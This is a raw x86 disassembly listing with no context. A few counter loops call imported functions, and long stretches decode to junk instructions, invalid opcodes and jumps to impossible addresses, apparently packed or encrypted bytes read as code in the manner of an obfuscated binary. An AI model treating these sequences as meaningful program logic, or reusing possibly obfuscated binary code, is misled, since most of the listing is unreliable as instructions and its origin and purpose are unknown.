  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b02
  403acb:	inc    ebp
  403acc:	mov    DWORD PTR gs:[eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b31
  403ad7:	adc    eax,edx
  403ad9:	ja     0x403b2a
  403adb:	push   cs
  403adc:	js     0x403b3a
  403ade:	loope  0x403b0f
  403ae0:	and    DWORD PTR [ecx-0x51],edx
  403ae3:	loopne 0x403b06
  403ae5:	sub    BYTE PTR [ebp+eax*4-0x56],bh
  403ae9:	and    BYTE PTR [edx+0x1f],0x8c
  403aed:	xor    al,0xc1
  403aef:	sub    eax,0x5bce2f86
  403af4:	call   0x8a0b6cd6
  403af9:	arpl   cx,bp
  403afb:	iret   
  403afc:	mov    edi,0x140ffdc6
  403b01:	jmp    0xaebe:0x20f7d804
  403b08:	pop    eax
  403b09:	lds    edi,FWORD PTR [esi]
  403b0b:	(bad)  
  403b0c:	jbe    0x403af7
  403b0e:	mov    al,0x26
  403b10:	mov    dh,0xe5
  403b12:	push   eax
  403b13:	outs   dx,DWORD PTR ds:[esi]
  403b14:	push   cs
  403b15:	mov    esp,0x2b1347f3
  403b1a:	dec    edi
  403b1b:	cmp    edi,esp
  403b1d:	out    0x20,al
  403b1f:	pop    ebp
  403b20:	out    0xe,al
  403b22:	sub    BYTE PTR ds:0x82db0ac6,dh
  403b28:	sub    al,0xe3
  403b2a:	jg     0x403abf
  403b2c:	push   esp
  403b2d:	int    0xa8
  403b2f:	jmp    0xf1f83899
  403b34:	mov    esi,0x30030ee7
  403b39:	in     al,dx
  403b3a:	or     ch,BYTE PTR [edi]
  403b3c:	add    eax,0x6c9bd909
  403b41:	(bad)  
  403b42:	mov    WORD PTR [ecx-0x52],cs
  403b45:	pusha  
  403b46:	fcomp  QWORD PTR [esi]
  403b48:	enter  0x8cda,0x86
  403b4c:	push   0xffffffa3
  403b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b4f:	push   eax
  403b50:	xchg   BYTE PTR [edx+0x54],bl
  403b53:	in     al,0x13
  403b55:	call   FWORD PTR [ecx+0x7359bbf2]
  403b5b:	out    0x10,eax
  403b5d:	inc    ebp
  403b5e:	popf   
  403b5f:	mov    ?,WORD PTR [edi-0x4]
  403b62:	iret   
  403b63:	xor    al,0x95
  403b65:	add    al,0x10
  403b67:	loop   0x403b34
  403b69:	icebp  
  403b6a:	sbb    al,0xc0
  403b6c:	stc    
  403b6d:	pop    es
  403b6e:	shl    DWORD PTR [ecx-0x79],cl
  403b71:	retf   0xe332
  403b74:	popa   
  403b75:	int3   
  403b76:	inc    ebx
  403b77:	daa    
  403b78:	mov    edi,0xabdab8e9
  403b7d:	fisubr WORD PTR [edi+ecx*8]
  403b80:	ja     0x403b15
  403b82:	inc    edx
  403b83:	add    dh,BYTE PTR [esi]
  403b85:	pop    ebx
  403b86:	mov    edx,0xdfcfc50f
  403b8b:	mov    al,ds:0xe36ab3f3
  403b90:	xchg   edi,eax
  403b91:	cmp    ch,BYTE PTR [eax+0x3d58ef70]
  403b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b99:	dec    ebp
  403b9a:	aam    0xa2
  403b9c:	popf   
  403b9d:	cmp    ebp,DWORD PTR [ebx]
  403b9f:	shl    DWORD PTR [esp+ebx*2],0x31
  403ba3:	jnp    0x403be9
  403ba5:	mov    bl,0xe9
  403ba7:	ficom  WORD PTR [eax]
  403ba9:	fistp  WORD PTR [ebx]
  403bab:	int    0x2d
  403bad:	xchg   esp,eax
  403bae:	sbb    DWORD PTR [eax],0x52393316
  403bb4:	jbe    0x403bc6
  403bb6:	bound  ebx,QWORD PTR ds:0x436963aa
  403bbc:	aaa    
  403bbd:	outs   dx,DWORD PTR ds:[esi]
  403bbe:	pop    es
  403bbf:	sub    BYTE PTR [ecx],0x1c
  403bc2:	icebp  
  403bc3:	lods   al,BYTE PTR ds:[esi]
  403bc4:	les    ecx,FWORD PTR [eax+ebx*1]
  403bc7:	int3   
  403bc8:	mov    fs,WORD PTR [ecx+esi*4+0x15aebc2a]
  403bcf:	adc    DWORD PTR [eax+0x500d2ce3],edx
  403bd5:	jle    0x403c1e
  403bd7:	mov    ds:0x33cf29a5,eax
  403bdc:	sub    esi,edx
  403bde:	fldcw  WORD PTR [ebx]
  403be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403be1:	repnz sahf 
  403be3:	mov    ebx,0xed072ae4
  403be8:	std    
  403be9:	add    dl,cl
  403beb:	jge    0x403baa
  403bed:	cmp    bh,cl
  403bef:	adc    eax,ebp
  403bf1:	(bad)  
  403bf2:	pop    ebp
  403bf3:	test   BYTE PTR [ecx-0x5],cl
  403bf6:	rol    DWORD PTR [eax-0x5a],1
  403bf9:	push   esp
  403bfa:	sub    dh,BYTE PTR [eax+0x3a4b9cd9]
  403c00:	push   edi
  403c01:	addr16 je 0x403b95
  403c04:	push   esp
  403c06:	sbb    BYTE PTR [edx+0x5a69c02f],al
  403c0c:	and    BYTE PTR ds:0x307f7a0e,0xcb
  403c13:	pop    esi
  403c14:	rol    DWORD PTR [ebx-0x4f5ed577],cl
  403c1a:	fs aam 0xdb
  403c1d:	fild   WORD PTR [edi-0x79]
  403c20:	das    
  403c21:	aas    
  403c22:	rol    DWORD PTR [esi-0x756555ad],0xac
  403c29:	pusha  
  403c2a:	fdiv   DWORD PTR [edx-0x53]
  403c2d:	fcom   QWORD PTR [bx+si-0x7]
  403c31:	dec    esi
  403c32:	cdq    
  403c33:	push   ds
  403c34:	pop    ds
  403c35:	mov    ds:0x477775df,al
  403c3a:	sub    eax,0x1839e211
  403c3f:	xlat   BYTE PTR ds:[ebx]
  403c40:	or     eax,0x4db97b8a
  403c45:	dec    esp
  403c46:	or     eax,0x9ef255df
  403c4b:	js     0x403bce
  403c4d:	inc    esi
  403c4e:	pusha  
  403c4f:	push   esp
  403c50:	adc    BYTE PTR [edi-0x6b],dh
  403c53:	cdq    
  403c54:	jecxz  0x403c99
  403c56:	jo     0x403be3
  403c58:	jle    0x403ccf
  403c5a:	push   edi
  403c5b:	push   cs
  403c5c:	mov    BYTE PTR [esi-0x1acd0044],dh
  403c62:	xchg   ebp,eax
  403c63:	and    eax,0xf285df38
  403c68:	hlt    
  403c69:	(bad)  
  403c6b:	adc    bl,dh
  403c6d:	ins    DWORD PTR es:[edi],dx
  403c6e:	lahf   
  403c6f:	xor    ebx,DWORD PTR [edx+0x8]
  403c72:	and    bh,bh
  403c74:	inc    eax
  403c75:	inc    edi
  403c76:	lods   al,BYTE PTR ds:[esi]
  403c77:	dec    edx
  403c78:	xor    eax,esi
  403c7a:	xlat   BYTE PTR ds:[ebx]
  403c7b:	jo     0x403c9f
  403c7d:	xchg   ecx,eax
  403c7e:	cmp    eax,0xd6e2cd12
  403c83:	in     eax,0xbf
  403c85:	mov    dl,0x5f
  403c87:	mov    esi,0x49f5028b
  403c8c:	dec    edx
  403c8d:	test   al,0xc2
  403c8f:	loopne 0x403d0b
  403c91:	xchg   esp,eax
  403c92:	dec    esi
  403c93:	xchg   edi,eax
  403c94:	mov    eax,ds:0xeb60b04c
  403c99:	sub    BYTE PTR [edx-0xc],dl
  403c9c:	jo     0x403c7d
  403c9e:	hlt    
  403c9f:	(bad)  
  403ca0:	call   0x1b194aa8
  403ca5:	outs   dx,BYTE PTR ds:[esi]
  403ca6:	xchg   ecx,eax
  403ca7:	outs   dx,DWORD PTR ds:[esi]
  403ca8:	lds    ecx,FWORD PTR [ebp-0x492f144d]
  403cae:	jb     0x403ce6
  403cb0:	jmp    0xcc23:0xee254776
  403cb7:	inc    esi
  403cb8:	xor    eax,0x5d4508b5
  403cbd:	pusha  
  403cbe:	std    
  403cbf:	sbb    eax,0x70afe574
  403cc4:	mov    dl,0x8a
  403cc6:	(bad)  
  403cc7:	sti    
  403cc8:	popa   
  403cc9:	inc    eax
  403cca:	into   
  403ccb:	pinsrw mm4,WORD PTR [eax*4+0x56114230],0x50
  403cd4:	and    esi,DWORD PTR ds:0x775e07d4
  403cda:	ror    BYTE PTR [ebp-0x2],cl
  403cdd:	enter  0xbef4,0xb1
  403ce1:	retf   0x85c1
  403ce4:	test   al,bh
  403ce6:	sub    cl,BYTE PTR [eax]
  403ce8:	mov    esi,gs
  403cea:	fwait
  403ceb:	cmp    edx,DWORD PTR [ecx+0x5c]
  403cee:	jmp    0xbe56c9de
  403cf3:	adc    eax,0x580ee428
  403cf8:	stos   BYTE PTR es:[edi],al
  403cf9:	xchg   ebp,eax
  403cfa:	mov    al,bh
  403cfc:	or     BYTE PTR [edi-0x7d],0xb0
  403d00:	push   esi
  403d01:	cs sub eax,0xbda27621
  403d07:	or     al,dh
  403d09:	retf   
  403d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0b:	cmp    ebx,eax
  403d0d:	into   
  403d0e:	fld    QWORD PTR [ecx+0x27f4aeae]
  403d14:	or     DWORD PTR [ebp+0x1b],eax
  403d17:	inc    edx
  403d18:	pushf  
  403d19:	lds    eax,FWORD PTR [eax-0x7e]
  403d1c:	add    BYTE PTR [esi],dh
  403d1e:	lea    esi,[eax+0x6d]
  403d21:	mul    bl
  403d23:	into   
  403d24:	mov    al,BYTE PTR [edi+0x26f141cb]
  403d2a:	pop    es
  403d2b:	jbe    0x403d81
  403d2d:	pop    eax
  403d2e:	xor    eax,0x84adc9aa
  403d33:	repz out dx,eax
  403d35:	repnz cli 
  403d37:	aaa    
  403d38:	push   eax
  403d39:	div    DWORD PTR [edx+0x3dc8a2f8]
  403d3f:	push   0x6d
  403d41:	or     al,cl
  403d43:	idiv   DWORD PTR [eax]
  403d45:	mov    eax,ds:0xe97a3455
  403d4a:	push   ebp
  403d4b:	rol    eax,0xb4
  403d4e:	mov    ecx,0x5d723ed8
  403d53:	rcl    DWORD PTR [edx],1
  403d55:	add    BYTE PTR [ebx],0x65
  403d58:	add    bh,dl
  403d5a:	fwait
  403d5b:	or     BYTE PTR [ebp+0x48a0a93c],bh
  403d61:	add    eax,DWORD PTR [ecx-0x2f8cc5e]
  403d67:	arpl   WORD PTR [ebp-0x425bbc5f],di
  403d6d:	and    DWORD PTR [edi+0x56270324],0x48fa242a
  403d77:	xchg   edi,eax
  403d78:	out    0x6,al
  403d7a:	xor    BYTE PTR [ebp+0x140f7137],bl
  403d80:	cmp    DWORD PTR [ebp+0x14],eax
  403d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d84:	dec    esp
  403d85:	in     al,0xec
  403d87:	xchg   edi,eax
  403d88:	mov    bh,0x76
  403d8a:	call   esi
  403d8c:	dec    edi
  403d8d:	mov    dh,BYTE PTR [ebx-0x11]
  403d90:	or     al,0xf9
  403d92:	mov    esp,0x68f14aa5
  403d97:	mov    al,0xe6
  403d99:	push   es
  403d9a:	ins    BYTE PTR es:[edi],dx
  403d9b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403d9d:	pop    ecx
  403d9e:	jg     0x403dcc
  403da0:	out    0x12,al
  403da2:	or     eax,0xbc413989
  403da7:	or     DWORD PTR [esi+0x78e337a5],0xf8a844fc
  403db1:	lahf   
  403db2:	daa    
  403db3:	clc    
  403db4:	imul   ebx,edx,0x1f5618d0
  403dba:	mov    edi,DWORD PTR ds:0x2bf05d8b
  403dc0:	fistp  QWORD PTR [ebx]
  403dc2:	fimul  DWORD PTR [edi]
  403dc4:	xchg   DWORD PTR [eax],ecx
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	add    BYTE PTR [ebx-0x5a1627ab],cl
  403dce:	add    eax,DWORD PTR [eax]
  403dd0:	add    BYTE PTR [ebx+0x7d8bd055],cl
  403dd6:	cld    
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffb8
  403e75:	push   0x1f0af19b
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e57
  403e81:	xchg   edx,eax
  403e82:	mov    esp,0xba9daf82
  403e87:	mov    edi,DWORD PTR [edx-0x4c]
  403e8a:	sub    eax,0xd2ddbf3
  403e8f:	sbb    eax,0x4df5b317
  403e94:	mov    ah,0xb2
  403e96:	xchg   ecx,ebx
  403e98:	and    al,BYTE PTR [ebx]
  403e9a:	xor    DWORD PTR [edi],edx
  403e9c:	adc    bl,BYTE PTR [ebx+0x591f5a02]
  403ea2:	pusha  
  403ea3:	push   ds
  403ea4:	cld    
  403ea5:	cwde   
  403ea6:	outs   dx,BYTE PTR ds:[esi]
  403ea7:	push   ebx
  403ea8:	and    BYTE PTR [esi+0x19d5059e],bh
  403eae:	scas   al,BYTE PTR es:[edi]
  403eaf:	ror    ah,1
  403eb1:	dec    edx
  403eb2:	sub    DWORD PTR [edi+esi*8],esp
  403eb5:	cmp    al,0x65
  403eb7:	fist   DWORD PTR [bp+si-0x4b]
  403ebb:	mov    ecx,DWORD PTR [ebp+0xb932c02]
  403ec1:	push   cs
  403ec2:	fadd   QWORD PTR [ecx+0xc]
  403ec5:	xor    BYTE PTR [ebp-0x5c],cl
  403ec8:	xchg   BYTE PTR [eax],bl
  403eca:	inc    esp
  403ecb:	jmp    0x997c1b00
  403ed0:	or     DWORD PTR [ebp+0x70],ebp
  403ed3:	sub    esi,esp
  403ed5:	sbb    ebx,DWORD PTR [esp+esi*1+0x57]
  403ed9:	mov    ds,WORD PTR [eax]
  403edb:	jo     0x403f08
  403edd:	(bad)  
  403edf:	dec    edx
  403ee0:	out    dx,eax
  403ee1:	pusha  
  403ee2:	int3   
  403ee3:	nop
  403ee4:	push   edx
  403ee5:	mov    dh,0xe5
  403ee7:	sub    esp,DWORD PTR [eax-0x3c]
  403eea:	add    esp,ecx
  403eec:	push   0x4e
  403eee:	gs pop esp
  403ef0:	bound  esp,QWORD PTR ds:0xec1a5d8d
  403ef6:	dec    ebp
  403ef7:	push   cs
  403ef8:	push   ds
  403ef9:	mov    WORD PTR [esi+0x29ab3118],ds
  403eff:	repz ja 0x403ecc
  403f02:	push   ebp
  403f03:	lods   al,BYTE PTR gs:[esi]
  403f05:	in     al,0x8e
  403f07:	add    BYTE PTR [esi+0x4320d154],bl
  403f0d:	mov    cl,0xe1
  403f0f:	out    0x19,eax
  403f11:	aad    0x20
  403f13:	mov    edi,0x2053802a
  403f18:	push   0xab743825
  403f1d:	inc    ecx
  403f1e:	call   0xb6c67c03
  403f23:	shr    BYTE PTR [ecx+0x29],0xc6
  403f27:	sbb    eax,0xff5a1fa
  403f2c:	adc    BYTE PTR ds:0xded4117e,0xb9
  403f33:	pusha  
  403f34:	adc    al,0xd6
  403f36:	dec    ebx
  403f37:	pusha  
  403f38:	or     al,BYTE PTR [edi]
  403f3a:	adc    esi,DWORD PTR [esp+esi*8-0x7fb43605]
  403f41:	fidiv  DWORD PTR [ebx+0x57]
  403f44:	rcl    esi,0x83
  403f47:	push   es
  403f48:	xchg   ebx,eax
  403f49:	jp     0x403ece
  403f4b:	ins    DWORD PTR es:[edi],dx
  403f4c:	pop    ebx
  403f4d:	imul   esp,DWORD PTR [edx-0x5c],0xffffff88
  403f51:	mov    dl,0xd
  403f53:	sub    dh,ch
  403f55:	iret   
  403f56:	sbb    eax,DWORD PTR [esi-0x5d5f0e18]
  403f5c:	jg     0x403f16
  403f5e:	outs   dx,BYTE PTR ds:[esi]
  403f5f:	rcl    BYTE PTR [ebx+0x19],cl
  403f62:	(bad)  
  403f63:	js     0x403fcc
  403f65:	mov    esi,0x679bc758
  403f6a:	dec    eax
  403f6b:	pop    ebx
  403f6c:	ja     0x403f66
  403f6e:	es jns 0x403f85
  403f71:	push   cs
  403f72:	js     0x403efe
  403f74:	dec    ecx
  403f75:	fidiv  DWORD PTR [edx+0x3e03b23e]
  403f7b:	xchg   edi,edx
  403f7d:	mov    WORD PTR [edx],gs
  403f7f:	and    BYTE PTR [ecx+0x7b],dh
  403f82:	int3   
  403f83:	mov    edx,0x66445847
  403f88:	xor    ebp,ebx
  403f8a:	jmp    0x403fbd
  403f8c:	xchg   edi,eax
  403f8d:	sub    ah,BYTE PTR [ebp+0x41a8791e]
  403f93:	pop    ecx
  403f94:	les    ecx,FWORD PTR [edx+eax*4+0x42]
  403f98:	ja     0x403fb6
  403f9a:	or     al,0xab
  403f9c:	pop    ecx
  403f9d:	push   ebp
  403f9e:	outs   dx,BYTE PTR ds:[esi]
  403f9f:	lock push cs
  403fa1:	cwde   
  403fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa3:	mov    edx,0x359df370
  403fa8:	jecxz  0x403ff5
  403faa:	scas   eax,DWORD PTR es:[edi]
  403fab:	sbb    eax,0xd406c72d
  403fb0:	and    BYTE PTR [ebx],bh
  403fb2:	es rol esi,cl
  403fb5:	retf   
  403fb6:	cmp    DWORD PTR [edi],eax
  403fb8:	data16 icebp 
  403fba:	sub    DWORD PTR [esi],0x6a
  403fbd:	dec    edx
  403fbe:	mov    edi,0x912424d8
  403fc3:	outs   dx,DWORD PTR ds:[esi]
  403fc4:	popa   
  403fc5:	jmp    0x403fe2
  403fc7:	sbb    DWORD PTR [edx-0x3254faf5],eax
  403fcd:	cmp    edi,DWORD PTR [esi+0x4b]
  403fd0:	cmp    eax,0x549d5ec0
  403fd5:	inc    ebp
  403fd6:	repnz test al,bl
  403fd9:	ret    
  403fda:	jle    0x404042
  403fdc:	pushf  
  403fdd:	call   0xe5e55638
  403fe2:	adc    eax,0xbd93b0d5
  403fe7:	ror    BYTE PTR [eax+0x53a5ae6],cl
  403fed:	arpl   WORD PTR [edi+0x41],cx
  403ff0:	xor    ch,BYTE PTR [ecx+0x5df776f8]
  403ff6:	ins    BYTE PTR es:[edi],dx
  403ff7:	mov    ah,0x65
  403ff9:	mov    esi,0xccef83f
  403ffe:	jb     0x404067
  404000:	sub    esp,DWORD PTR [eax]
  404002:	xchg   DWORD PTR [edi+0x45],esi
  404005:	add    edx,DWORD PTR [ebp+0x63]
  404008:	jecxz  0x40400b
  40400a:	mov    ch,dl
  40400c:	jae    0x403fae
  40400e:	test   dh,bh
  404010:	cs cmp bl,bh
  404013:	cmp    bh,BYTE PTR [edx-0x3]
  404016:	cdq    
  404017:	jmp    0xe1f7:0xbceef9a1
  40401e:	xor    eax,ebp
  404020:	sub    ebp,DWORD PTR [ebp+0x11]
  404023:	dec    ebx
  404024:	jmp    DWORD PTR [eax-0x5d]
  404027:	hlt    
  404028:	stos   DWORD PTR es:[edi],eax
  404029:	xchg   BYTE PTR [edx],ah
  40402b:	mov    cl,ah
  40402d:	fidivr DWORD PTR [ecx-0x44cfb34]
  404033:	xlat   BYTE PTR ds:[ebx]
  404034:	enter  0x412f,0x93
  404038:	es dec esi
  40403a:	xchg   DWORD PTR [ecx-0x69b30675],edi
  404040:	pop    eax
  404041:	mov    bl,0x57
  404043:	mov    esp,ss
  404045:	cld    
  404046:	xor    BYTE PTR [ebx-0x1a],dh
  404049:	pop    esi
  40404a:	outs   dx,BYTE PTR ds:[esi]
  40404b:	sub    ebx,DWORD PTR [edx+0x58]
  40404e:	xchg   ebp,eax
  40404f:	retf   0xc993
  404052:	add    ecx,0xffffffa7
  404055:	sbb    BYTE PTR [edx+0x29a6e2b0],ah
  40405b:	cld    
  40405c:	pop    edx
  40405d:	out    0x62,eax
  40405f:	arpl   bp,ax
  404061:	lea    ebx,[edx]
  404063:	stos   DWORD PTR es:[edi],eax
  404064:	ret    
  404065:	ret    0x3e84
  404068:	xchg   edx,eax
  404069:	jecxz  0x4040c3
  40406b:	dec    edx
  40406c:	push   ebx
  40406d:	cmp    eax,0x905073c9
  404072:	data16 mov ds:0x3ab29eb8,al
  404078:	adc    eax,0x2b05bf39
  40407d:	mov    bh,0x97
  40407f:	cmp    al,0xd9
  404081:	repz mov al,BYTE PTR [edx+0x77b2de13]
  404088:	fwait
  404089:	push   ebp
  40408a:	enter  0xc10e,0xf4
  40408e:	pop    edx
  40408f:	adc    ebp,DWORD PTR [ebp+ebp*8-0x68]
  404093:	in     al,dx
  404094:	psrld  mm4,QWORD PTR [ebx]
  404097:	lea    eax,[ebx-0x62]
  40409a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409b:	daa    
  40409c:	addr16 mov cl,0x5e
  40409f:	and    bh,bh
  4040a1:	gs mov cl,0xbd
  4040a4:	add    bl,BYTE PTR [esi]
  4040a6:	adc    al,cl
  4040a8:	ins    BYTE PTR es:[edi],dx
  4040a9:	and    BYTE PTR [eax-0x3e],bl
  4040ac:	xlat   BYTE PTR ds:[ebx]
  4040ad:	xor    eax,0xa8c336f1
  4040b2:	xchg   ebx,eax
  4040b3:	and    eax,0xcbb92a2a
  4040b8:	out    dx,eax
  4040b9:	sar    BYTE PTR [edi-0x38],1
  4040bc:	pop    ebx
  4040bd:	rcr    DWORD PTR [eax+0x4eb28cbe],0x20
  4040c4:	in     al,0x4
  4040c6:	cmp    eax,0x154027d
  4040cb:	cs clc 
  4040cd:	cmc    
  4040ce:	mov    dh,0x19
  4040d0:	into   
  4040d1:	inc    edx
  4040d2:	xchg   DWORD PTR [ebx+esi*4+0x69],ebx
  4040d6:	in     al,0x3
  4040d8:	jmp    0xca2c:0x3397b2c3
  4040df:	hlt    
  4040e0:	pop    ss
  4040e1:	inc    ecx
  4040e2:	sbb    ch,ah
  4040e4:	pop    ebp
  4040e5:	popf   
  4040e6:	mov    esi,eax
  4040e8:	mov    ds:0xbcfe032b,al
  4040ed:	jg     0x4040ab
  4040ef:	xchg   esi,eax
  4040f0:	sti    
  4040f1:	out    dx,eax
  4040f2:	jecxz  0x4040f1
  4040f4:	inc    edx
  4040f5:	pop    eax
  4040f6:	pushf  
  4040f7:	aas    
  4040f8:	add    BYTE PTR [eax+0x6351e69],0xc9
  4040ff:	popa   
  404100:	sbb    ecx,DWORD PTR [edi-0x18]
  404103:	xchg   esi,eax
  404104:	imul   esp,DWORD PTR ds:0xc4a6a02,0x53a274f8
  40410e:	sbb    ecx,eax
  404110:	jecxz  0x4040b3
  404112:	imul   ecx,DWORD PTR [ecx-0x7d],0xffffffb2
  404116:	aas    
  404117:	ins    DWORD PTR es:[edi],dx
  404118:	inc    eax
  404119:	jmp    0x4040f0
  40411b:	dec    ebp
  40411c:	dec    eax
  40411d:	pop    edi
  40411e:	add    DWORD PTR [edx+ebx*2],edx
  404121:	or     dh,ch
  404123:	xor    al,0xb7
  404125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404126:	dec    esp
  404127:	es dec edi
  404129:	pop    ss
  40412a:	sbb    DWORD PTR [ecx+0x4098d208],0x31
  404131:	sbb    BYTE PTR [eax+0x56366a40],bl
  404137:	pop    ebp
  404138:	mov    dl,0xe8
  40413a:	pop    ebp
  40413b:	xchg   ecx,eax
  40413c:	mov    ecx,0xbc83ce28
  404141:	dec    esi
  404142:	cmp    BYTE PTR [edi],bh
  404144:	or     dh,0xbc
  404147:	hlt    
  404148:	and    eax,0x2ba339ef
  40414d:	shl    ah,cl
  40414f:	in     al,0x1f
  404151:	les    ecx,FWORD PTR [ecx+0x2f206a64]
  404157:	inc    edi
  404158:	xchg   esi,eax
  404159:	out    0x6,eax
  40415b:	enter  0x138d,0xb2
  40415f:	scas   al,BYTE PTR es:[edi]
  404160:	push   eax
  404161:	push   cs
  404162:	arpl   WORD PTR [esi-0x20d4fa97],bx
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [esi+eiz*4],bh
  40418c:	lods   eax,DWORD PTR ds:[esi]
  40418d:	leave  
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041ef
  404197:	lea    ebp,[edx]
  404199:	in     eax,0x9d
  40419b:	jns    0x404219
  40419d:	daa    
  40419e:	mov    dh,0x5
  4041a0:	pusha  
  4041a1:	jmp    FWORD PTR [eax+0x43]
  4041a4:	sbb    eax,0x3fbfce03
  4041a9:	pop    edx
  4041aa:	in     eax,dx
  4041ab:	jp     0x404212
  4041ad:	and    BYTE PTR [eax-0x6],bh
  4041b0:	cdq    
  4041b1:	mov    edi,0x70f89b6e
  4041b6:	add    dl,0x1c
  4041b9:	push   ebx
  4041ba:	push   ecx
  4041bb:	dec    eax
  4041bc:	and    DWORD PTR [esi+0x44522374],ecx
  4041c2:	pop    ds
  4041c3:	adc    BYTE PTR [edx],al
  4041c5:	sahf   
  4041c6:	mov    ebp,0x5e39b776
  4041cb:	iret   
  4041cc:	fbstp  TBYTE PTR [edx]
  4041ce:	push   cs
  4041cf:	mov    ebp,0xc5698e3a
  4041d4:	and    eax,DWORD PTR [ecx+0x2b]
  4041d7:	sti    
  4041d8:	adc    eax,0xbb1891b7
  4041dd:	mov    edx,0xdd4aaf7e
  4041e2:	je     0x4041b8
  4041e4:	or     eax,0x4bd2f4c1
  4041e9:	adc    DWORD PTR [eax+0x71],ebx
  4041ec:	stc    
  4041ed:	shr    BYTE PTR [edx-0x14811809],0x7e
